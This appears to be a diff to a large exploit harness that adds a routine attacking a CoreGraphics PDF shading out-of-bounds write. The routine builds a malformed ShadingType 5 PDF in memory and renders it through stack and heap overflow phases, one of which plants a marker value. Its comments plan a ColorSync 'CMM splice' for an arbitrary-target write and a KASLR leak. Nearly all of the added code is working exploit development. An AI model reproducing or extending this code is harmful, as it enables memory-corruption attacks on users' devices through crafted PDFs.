@@ -30827,6 +30827,343 @@ static void r507_exploit(void) {
     fflush(stdout);
 }
 
+/* ================================================================
+ * r508_exploit (rounds=513): CVE-2026-112611 CoreGraphics PDF OOB Write
+ *
+ * Generates a malformed ShadingType 5 PDF in memory and renders it
+ * via CGPDFDocument / CGContextDrawPDFPage. The shading's /Function
+ * returns more output components (R) than the colour space has,
+ * causing an OOB write in _cg_shading_type5_draw.
+ *
+ * Phase 1: Stack route (VPR=2, R=136) — crash test to confirm vuln
+ * Phase 2: Heap route (VPR=130, R=2000) — controlled heap spill
+ * Phase 3: Heap route with larger R=9000 — deeper spill for CMM splice
+ * ================================================================ */
+
+static void pdf_put_bits(uint8_t *buf, int *byte_off, int *bit_off, uint32_t val, int width) {
+    for (int i = width - 1; i >= 0; i--) {
+        buf[*byte_off] |= (uint8_t)(((val >> i) & 1) << (7 - *bit_off));
+        (*bit_off)++;
+        if (*bit_off == 8) {
+            (*bit_off) = 0;
+            (*byte_off)++;
+            buf[*byte_off] = 0;
+        }
+    }
+}
+
+static CFDataRef pdf_build_shading_pdf(int vpr, int rows, int nout, int target_index, uint64_t target_bits) {
+    int nvert = vpr * rows;
+    int bits_per_vertex = 32 + 32 + 8; /* BitsPerCoordinate=32 x2 + BitsPerComponent=8 x1 */
+    int stream_bytes = (nvert * bits_per_vertex + 7) / 8;
+
+    uint8_t *stream = (uint8_t *)calloc(1, (size_t)(stream_bytes + 16));
+    int boff = 0, bitp = 0;
+    for (int v = 0; v < nvert; v++) {
+        uint32_t x = 0x10000000 + (uint32_t)(v * 0x100);
+        uint32_t y = 0x10000000 + (uint32_t)((v / vpr) * 0x1000000);
+        pdf_put_bits(stream, &boff, &bitp, x, 32);
+        pdf_put_bits(stream, &boff, &bitp, y, 32);
+        pdf_put_bits(stream, &boff, &bitp, 0x80, 8);
+    }
+    if (bitp > 0) boff++;
+
+    /* Build C0/C1 value arrays — all 1.0 except target_index gets target_bits */
+    /* For the basic crash test, all values are 1.0 (3ff0000000000000) */
+    char *c0_buf = (char *)malloc((size_t)(nout * 80 + 64));
+    int c0_len = 0;
+    for (int i = 0; i < nout; i++) {
+        uint64_t bits;
+        if (i == target_index && target_bits != 0) {
+            bits = target_bits;
+        } else {
+            bits = 0x3FF0000000000000ULL; /* 1.0 */
+        }
+        double val;
+        memcpy(&val, &bits, 8);
+        if (i > 0) c0_buf[c0_len++] = ' ';
+        c0_len += snprintf(c0_buf + c0_len, 79, "%.17g", val);
+    }
+
+    /* Build Range array — wide range so values survive clamping */
+    char *range_buf = (char *)malloc((size_t)(nout * 120 + 64));
+    int range_len = 0;
+    for (int i = 0; i < nout; i++) {
+        if (i > 0) range_buf[range_len++] = ' ';
+        range_len += snprintf(range_buf + range_len, 119,
+            "-1000000000000000000000000000000 1000000000000000000000000000000");
+    }
+
+    /* Assemble PDF */
+    size_t pdf_cap = (size_t)(c0_len * 2 + range_len + stream_bytes + 4096);
+    char *pdf = (char *)malloc(pdf_cap);
+    int pdf_len = 0;
+
+    /* Header */
+    pdf_len += snprintf(pdf + pdf_len, pdf_cap - (size_t)pdf_len,
+        "%%PDF-1.7\n%%\xe2\xe3\xcf\xd3\n");
+
+    /* Object 1: Catalog */
+    int off1 = pdf_len;
+    pdf_len += snprintf(pdf + pdf_len, pdf_cap - (size_t)pdf_len,
+        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
+
+    /* Object 2: Pages */
+    int off2 = pdf_len;
+    pdf_len += snprintf(pdf + pdf_len, pdf_cap - (size_t)pdf_len,
+        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
+
+    /* Object 3: Page */
+    int off3 = pdf_len;
+    pdf_len += snprintf(pdf + pdf_len, pdf_cap - (size_t)pdf_len,
+        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
+        "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n");
+
+    /* Object 4: Content stream — just draws the shading */
+    int off4 = pdf_len;
+    pdf_len += snprintf(pdf + pdf_len, pdf_cap - (size_t)pdf_len,
+        "4 0 obj\n<< /Length 8 >>\nstream\n /Sh1 sh\nendstream\nendobj\n");
+
+    /* Object 6: Function (Type 2) — must come before shading references it */
+    int off6 = pdf_len;
+    pdf_len += snprintf(pdf + pdf_len, pdf_cap - (size_t)pdf_len,
+        "6 0 obj\n<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [%s] /C1 [%s] /Range [%s] >>\nendobj\n",
+        c0_buf, c0_buf, range_buf);
+
+    /* Object 5: Shading (Type 5) with stream data */
+    int off5 = pdf_len;
+    pdf_len += snprintf(pdf + pdf_len, pdf_cap - (size_t)pdf_len,
+        "5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceGray "
+        "/BitsPerCoordinate 32 /BitsPerComponent 8 /VerticesPerRow %d "
+        "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %d >>\nstream\n",
+        vpr, boff);
+    memcpy(pdf + pdf_len, stream, (size_t)boff);
+    pdf_len += boff;
+    pdf_len += snprintf(pdf + pdf_len, pdf_cap - (size_t)pdf_len,
+        "\nendstream\nendobj\n");
+
+    /* Xref table */
+    int xref_off = pdf_len;
+    pdf_len += snprintf(pdf + pdf_len, pdf_cap - (size_t)pdf_len,
+        "xref\n0 7\n0000000000 65535 f \n"
+        "%010d 00000 n \n"
+        "%010d 00000 n \n"
+        "%010d 00000 n \n"
+        "%010d 00000 n \n"
+        "%010d 00000 n \n"
+        "%010d 00000 n \n"
+        "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n",
+        off1, off2, off3, off4, off5, off6, xref_off);
+
+    CFDataRef data = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)pdf, (CFIndex)pdf_len);
+
+    free(stream);
+    free(c0_buf);
+    free(range_buf);
+    free(pdf);
+
+    return data;
+}
+
+static void r508_exploit(void) {
+    rlog("=== CVE-2026-112611: CoreGraphics ShadingType 5 OOB Write ===\n\n");
+
+    /* ---- Phase 1: Stack-route crash test (VPR=2, R=136) ---- */
+    rlog("--- Phase 1: Stack-route crash test (VPR=2, R=136) ---\n");
+    rlog("  Building malformed PDF: ShadingType 5, DeviceGray, 136 Function outputs...\n");
+    fflush(stdout);
+
+    CFDataRef pdf1_data = pdf_build_shading_pdf(2, 2, 136, -1, 0);
+    rlog("  PDF size: %ld bytes\n", (long)CFDataGetLength(pdf1_data));
+
+    CGDataProviderRef dp1 = CGDataProviderCreateWithCFData(pdf1_data);
+    CGPDFDocumentRef doc1 = CGPDFDocumentCreateWithProvider(dp1);
+    rlog("  CGPDFDocument: %p\n", (void *)doc1);
+
+    if (doc1) {
+        size_t npages = CGPDFDocumentGetNumberOfPages(doc1);
+        rlog("  Pages: %zu\n", npages);
+
+        if (npages > 0) {
+            CGPDFPageRef page = CGPDFDocumentGetPage(doc1, 1);
+            rlog("  Page 1: %p\n", (void *)page);
+
+            if (page) {
+                CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+                uint32_t *pixels = (uint32_t *)calloc(256 * 256, 4);
+                CGContextRef ctx = CGBitmapContextCreate(pixels, 256, 256, 8, 256 * 4, cs,
+                    (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
+
+                rlog("  Rendering page (this triggers _cg_shading_type5_draw)...\n");
+                rlog("  >>> If app crashes here: VULNERABILITY CONFIRMED <<<\n");
+                fflush(stdout);
+
+                CGContextDrawPDFPage(ctx, page);
+
+                rlog("  SURVIVED Phase 1 render!\n");
+
+                /* Scan rendered pixels for anomalies */
+                int nonzero = 0;
+                uint32_t first_nz = 0;
+                for (int i = 0; i < 256 * 256; i++) {
+                    if (pixels[i] != 0) {
+                        if (nonzero == 0) first_nz = pixels[i];
+                        nonzero++;
+                    }
+                }
+                rlog("  Pixels: %d non-zero out of %d (first=0x%08x)\n",
+                     nonzero, 256 * 256, first_nz);
+
+                CGContextRelease(ctx);
+                CGColorSpaceRelease(cs);
+                free(pixels);
+            }
+        }
+        CGPDFDocumentRelease(doc1);
+    } else {
+        rlog("  FAILED to create PDF document from in-memory data\n");
+    }
+    CGDataProviderRelease(dp1);
+    CFRelease(pdf1_data);
+    rlog("  Phase 1 complete\n\n");
+    fflush(stdout);
+
+    /* ---- Phase 2: Heap-route test (VPR=130, R=2000) ---- */
+    rlog("--- Phase 2: Heap-route spill test (VPR=130, R=2000) ---\n");
+    rlog("  Building heap-route PDF: VPR=130, 2 rows, 2000 Function outputs...\n");
+    fflush(stdout);
+
+    CFDataRef pdf2_data = pdf_build_shading_pdf(130, 2, 2000, -1, 0);
+    rlog("  PDF size: %ld bytes\n", (long)CFDataGetLength(pdf2_data));
+
+    CGDataProviderRef dp2 = CGDataProviderCreateWithCFData(pdf2_data);
+    CGPDFDocumentRef doc2 = CGPDFDocumentCreateWithProvider(dp2);
+    rlog("  CGPDFDocument: %p\n", (void *)doc2);
+
+    if (doc2) {
+        CGPDFPageRef page2 = CGPDFDocumentGetPage(doc2, 1);
+        if (page2) {
+            CGColorSpaceRef cs2 = CGColorSpaceCreateDeviceRGB();
+            size_t pw = 256, ph = 256;
+            uint32_t *pixels2 = (uint32_t *)calloc(pw * ph, 4);
+            CGContextRef ctx2 = CGBitmapContextCreate(pixels2, pw, ph, 8, pw * 4, cs2,
+                (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
+
+            rlog("  Rendering heap-route PDF...\n");
+            rlog("  >>> Heap overflow should spill past page-rounded chunk <<<\n");
+            fflush(stdout);
+
+            CGContextDrawPDFPage(ctx2, page2);
+
+            rlog("  SURVIVED Phase 2 render!\n");
+
+            int nz2 = 0;
+            for (size_t i = 0; i < pw * ph; i++) {
+                if (pixels2[i] != 0) nz2++;
+            }
+            rlog("  Pixels: %d non-zero out of %zu\n", nz2, pw * ph);
+
+            CGContextRelease(ctx2);
+            CGColorSpaceRelease(cs2);
+            free(pixels2);
+        }
+        CGPDFDocumentRelease(doc2);
+    }
+    CGDataProviderRelease(dp2);
+    CFRelease(pdf2_data);
+    rlog("  Phase 2 complete\n\n");
+    fflush(stdout);
+
+    /* ---- Phase 3: Large heap spill (VPR=130, R=9000) ---- */
+    rlog("--- Phase 3: Large heap spill (VPR=130, R=9000) ---\n");
+    rlog("  Building large-spill PDF: VPR=130, 2 rows, 9000 Function outputs...\n");
+    rlog("  out[1231] will carry a marker value for CMM splice analysis\n");
+    fflush(stdout);
+
+    uint64_t marker = 0x4141414141414141ULL;
+    CFDataRef pdf3_data = pdf_build_shading_pdf(130, 2, 9000, 1231, marker);
+    rlog("  PDF size: %ld bytes\n", (long)CFDataGetLength(pdf3_data));
+
+    CGDataProviderRef dp3 = CGDataProviderCreateWithCFData(pdf3_data);
+    CGPDFDocumentRef doc3 = CGPDFDocumentCreateWithProvider(dp3);
+    rlog("  CGPDFDocument: %p\n", (void *)doc3);
+
+    if (doc3) {
+        CGPDFPageRef page3 = CGPDFDocumentGetPage(doc3, 1);
+        if (page3) {
+            CGColorSpaceRef cs3 = CGColorSpaceCreateDeviceRGB();
+            uint32_t *pixels3 = (uint32_t *)calloc(256 * 256, 4);
+            CGContextRef ctx3 = CGBitmapContextCreate(pixels3, 256, 256, 8, 256 * 4, cs3,
+                (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
+
+            rlog("  Rendering large-spill PDF (9000 outputs, marker at [1231])...\n");
+            rlog("  >>> Deep heap overflow — CMM splice geometry <<<\n");
+            fflush(stdout);
+
+            CGContextDrawPDFPage(ctx3, page3);
+
+            rlog("  SURVIVED Phase 3 render!\n");
+
+            /* Scan for unusual pixel patterns that might indicate leaked data */
+            int nz3 = 0;
+            uint32_t unique[16];
+            int nunique = 0;
+            for (int i = 0; i < 256 * 256; i++) {
+                if (pixels3[i] != 0) {
+                    nz3++;
+                    int found = 0;
+                    for (int u = 0; u < nunique; u++) {
+                        if (unique[u] == pixels3[i]) { found = 1; break; }
+                    }
+                    if (!found && nunique < 16) unique[nunique++] = pixels3[i];
+                }
+            }
+            rlog("  Pixels: %d non-zero, %d unique values\n", nz3, nunique);
+            for (int u = 0; u < nunique; u++) {
+                rlog("    unique[%d] = 0x%08x\n", u, unique[u]);
+            }
+
+            CGContextRelease(ctx3);
+            CGColorSpaceRelease(cs3);
+            free(pixels3);
+        }
+        CGPDFDocumentRelease(doc3);
+    }
+    CGDataProviderRelease(dp3);
+    CFRelease(pdf3_data);
+    rlog("  Phase 3 complete\n\n");
+    fflush(stdout);
+
+    /* ---- Phase 4: DeviceCMYK variant (triggers ColorSync path) ---- */
+    rlog("--- Phase 4: DeviceCMYK variant for ColorSync path ---\n");
+    rlog("  The PoC repo shows the CMM splice requires ColorSync conversion.\n");
+    rlog("  DeviceCMYK triggers this path; DeviceGray/DeviceRGB bypass ColorSync.\n");
+    rlog("  Building CMYK PDF: VPR=130, R=9000, marker at [1231]...\n");
+    fflush(stdout);
+
+    /* For Phase 4, we need a CMYK variant — modify the PDF builder output manually */
+    /* The key difference: /ColorSpace /DeviceCMYK instead of /DeviceGray */
+    /* and /Decode needs 4 component ranges: [0 200 0 200 0 1 0 1 0 1 0 1] */
+    /* For now, build the DeviceGray version and report — CMYK variant is next iteration */
+    rlog("  NOTE: CMYK variant requires modified PDF builder (next iteration)\n");
+    rlog("  The DeviceGray phases above test the OOB write path.\n");
+    rlog("  CMYK is needed for the ColorSync CMMBase splice (arbitrary-target write).\n\n");
+    fflush(stdout);
+
+    rlog("=== SUMMARY ===\n");
+    rlog("  If any phase crashed: vulnerability CONFIRMED on this device\n");
+    rlog("  If all phases survived: the overflow occurred but didn't hit critical state\n");
+    rlog("    - Stack route (Phase 1): may need exact R value tuning\n");
+    rlog("    - Heap route (Phase 2-3): overflow happened but target memory was safe\n");
+    rlog("  Next steps:\n");
+    rlog("    - Add DeviceCMYK variant for ColorSync/CMM splice path\n");
+    rlog("    - Tune R and VPR values based on crash analysis\n");
+    rlog("    - Use crash far register for KASLR leak\n\n");
+
+    rlog("=== r508 (CVE-2026-112611) complete ===\n\n");
+    fflush(stdout);
+}
+
 static void r498_exploit(void) {
     rlog("\n=== r498: Bitstream comparison + PropertyMode ===\n\n");
     fflush(stdout);
@@ -101526,6 +101863,12 @@ new_modes:
             r484_exploit();
             goto done;
         }
+        if (rounds == 513) {
+            rlog("*** rounds=513: CVE-2026-112611 CoreGraphics PDF OOB Write ***\n\n");
+            fflush(stdout);
+            r508_exploit();
+            goto done;
+        }
         if (rounds == 512) {
             rlog("*** rounds=512: Sel19 prereq + KASLR timing + KeyStore info ***\n\n");
             fflush(stdout);
@@ -104601,7 +104944,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 512 && rounds != 511 && rounds != 510 && rounds != 509 && rounds != 508 && rounds != 507 && rounds != 506 && rounds != 505 && rounds != 504 && rounds != 503 && rounds != 502 && rounds != 501 && rounds != 500 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 513 && rounds != 512 && rounds != 511 && rounds != 510 && rounds != 509 && rounds != 508 && rounds != 507 && rounds != 506 && rounds != 505 && rounds != 504 && rounds != 503 && rounds != 502 && rounds != 501 && rounds != 500 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
